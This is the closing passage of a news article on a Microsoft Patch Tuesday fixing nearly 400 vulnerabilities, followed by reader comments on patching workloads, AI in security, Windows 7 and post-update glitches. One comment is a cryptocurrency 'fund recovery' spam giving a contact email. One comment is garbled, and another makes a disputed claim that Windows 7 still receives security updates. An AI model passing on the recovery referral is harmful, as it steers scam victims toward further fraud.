-Tyler Reguly at Fortra says while reports of Microsoft patching hundreds of vulnerabilities in one go have prompted some organizations to try to patch faster, it’s important to bear in mind that only one of the almost 400 bugs addressed today is known to be actively exploited. Reguly suggested security leaders check in with their teams to see how they’re handling the increasing workloads, which often involve testing fixes before deploying them in production environments.
-“If you’re a chief security officer talk to your teams about how they are shifting or modifying their workflows to better accommodate the patching shift that we’re seeing and support them across various organizational units by enabling the changes they want to see made,” Reguly said. “There’s no need to rush these updates, no matter what various vendors and organizations try to tell you. You need to make sure that you are rolling out safe updates that will not negatively impact your systems.”
-Speaking of the humans behind the keyboards, don’t neglect to backup your system and/or data before applying this month’s monster patch load. The day after each month’s Patch Tuesday is sometimes derisively referred to as Reboot Wednesday, but it generally doesn’t hurt to wait a few days to apply these huge update bundles because it sometimes takes a couple of days for the occasional misbehaving patch to get ironed out properly by Microsoft.
-For a clickable, per-patch breakdown by severity and urgency, check out [this roundup](https://isc.sans.edu/diary/Microsoft%20Patch%20Tuesday%20August%202026/33236) from the SANS Internet Storm Center.
-Time to rewrite the code using the help of AI to create a new base with less security holes and easier to maintain.
-Windows 12?
-This would do no good.
-This is why I still use Windows 7. I was never convinced that the Microsoft upgrades did anything other than refine their advertising for XBOX or whatever. The entire suite of Windows versions is riddled with security problems, despite the ridicule offered by IT colleagues. By the way I still receive the monthly Patch Tuesday security updates despite promises from Microsoft that older versions of Windows are not supported. They know as we know now, Microsoft Windows is a sinking ship.
-You get virus definition type ‘updates’ monthly, rarely an actual ‘security update’ on 7. That doesn’t help a lot.
-If you however run behind a firewall and don’t reach out to bad stuff, you’ll be fine until you aren’t.
-You deserve to be ridiculed for thinking Windows 7 is secure in 2026. You are *not* getting ‘patch Tuesday’ updates. This comment is wild and you seem like the type of person to use Windows 7 just to say you are still using Windows 7. How brave.
-Technically most people’s footprints are most greatly reduced by choice of browser; can’t get past that (or the third party app) and aren’t going to get too far achieving ring 0.
-So don’t be daft. It is not impossible to have an almost locked down Windows 7 install in 2026. Most people don’t but that is because most people just don’t know s#it about how to secure their system, or Windows 7 because their system has less than the 8gb of ram that MS builds into their developers’ mindsets as an acceptable amount of minimum ram to require to run either of the more current versions of Windows.
-But seriously. Most people would be fine with the most recent patches and enough knowledge of what is exploitable that is not patched by Microsoft to work around it or lock it down another way. Or run it virtualized (which is so nice because it removes the annoyances of having Windows as a host OS and linking being able to exploit that to anything without a virtual machine escape, in the first place (and for that usually you would have to be an actual target and dealing with someone with actual skills not just automated attacks and attempts at the most low-hanging fruit).
-Sorry, that should be, or they run Windows 7 because (they lack RAM)
-Funny how AI helps find the flaws and create exploits to attack them. But the AI is used to create patches and help keep software safe. Just seems like AI has just up’d the ante’ on everything good and bad. Jury still out and where this is all going. Me, I am not optimistic.
-My thought on how good AI will be at creating patches is to liken today to a few years ago when the attacker was very much more human: it is far easier to find & exploit vulnerabilities then it is to create secure software without security testing. AI hasn’t changed the latter at scale, yet. I imagine a time coming when more people shift their thinking, time, and money towards AI assisted code reviews.
-Does it count still when they are all extorted from submitters…security…Microsoft…..haha maybe against them…
-Using AI to find security issues isn’t a bad thing but I’m worried we’re heading towards too much dependence on it. AI has already shown the ability to hack websites without any human interaction. Can anyone say ‘Skynet’? (from the Terminator movies)
-“AI can be an extraordinary patching partner, but today it still needs a skilled human at the keyboard.” Hopefully just not a Connor Riley Moucka.
-Brian, your sarcasm has improved slightly. It is too late.
-Having been in security for decades upon decades now (which is to say, at least since Patch Tuesdays came around rather recently), I still cannot figure out why this is not tested the previous week by Microsoft then rolled out on Patch Wednesdays or Patch Thursdays not Tuesdays.
-The race condition is not that fiddly. If it were 2006 then it might have been a pain to exploit, but with modern systems with plenty of processing power and memory, certainly faster and doable. Good thing it is being patched!
-I have never looked into it. But I thought pretesting patches was a purpose of the optional preview downloads the month before Patch Tuesday. (I don’t think I have ever downloaded that.)
-That’s nice. It’s a shame there is nothing good to replace it. I suppose you think Linux is a good alternative to it for normal people. It isn’t (I say this is a techie, can we just not be so much?) The truth is it is still most people’s only option. Linux is a cauldron of thousands of peoples’ most bizarre old thoughts intermingling in hell.
-(and osx/Mac os is pretty bad too, derwin)
-It’s not that easy to get back a scammed funds because these scammers are very smart and they will cover their traces but if you manage to find a trustworthy and reliable Recovery company because many scammers are out there disguising as Recovery agents and will only take your money without recovering your funds, I was a victim of such myself after loosing all my funds to cryptocurrency scam. I sort for a help and I met few recovery agents, I was scammed by a particular one again Luckily for me I was referred to these legitimate company and they where able to recover my money back to me. You can as well contact them on RECOVERYDAREK AT gmail DOT com
-After doing these updates this evening, my keyboard stopped working. I usually have no problems with Microsoft updates. I queried ChatGPT. It told me to unplug the keyboard from the CPU, wait 10 seconds, and then plug it back in. That worked. I am not an IT person. An everyday computer user who is grateful for Krebsonsecurity.com.
-just finished my update and no problems. i’m on older desktop with Win10.
-Just found another issue after latest Windows update. My file history is no longer working. Last time it worked was just before my doing the Windows update. Did a lot of back and forth with ChatGPT and the end result is that it was due to the Windows update. Since I also back up to an external hard drive, I elected to wait and see if there is a fix from Microsoft. Anyone else having this issue?
-Nearly 400 security fixes in a single update really shows how challenging modern software security has become. The point about AI being better at finding vulnerabilities than reliably fixing them is especially interesting.
-Microsoft’s Autter at finding vulnerabilities than at reliably fixing bout human-in-the-lresonate. That samution applies to our dailment handling
-Is that like Flutter?
-This piece is a sobering look at how AI has flooded us with vulnerability discoveries while patching remains stubbornly human. Microsoft fixing 398 holes in one go — with LLM-generated patches failing over half the time — underscores that speed does not equal safety.
-Finally got rid of my Western Union prepaid debit card I had for emergencies since Google and Yahoo and AOL and Bing! kept insisting people were somewhere soon sending money to Crichton characters in 2001 and suggesting I stock up on medieval weapons. The card was never even used and had a zero balance. Can they patch for AI system raiding? Thanks.
-This was a really interesting article. I didn’t realize Microsoft had to fix almost 400 security vulnerabilities at once. It really shows why keeping systems and software updated is so important. I also think it’s a good reminder for people going into cybersecurity that there are always new vulnerabilities being discovered, so you have to stay informed and keep learning. Even one vulnerability that doesn’t get patched could give an attacker a way into a system.
-I think this article shows how important it is to keep software updated. Fixing nearly 400 security vulnerabilities is a lot, and it shows how many risks can come from outdated software.
-For some odd reason, every time I do an update, my keyboard and mouse stop working. I always have to disconnect the Bluetooth, forget the device and reconnect for it to work again.
-I noticed problems recently with defender scans eating up memory and running way too frequently, but just figured it was the normal defender scan and not a new defender scan.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
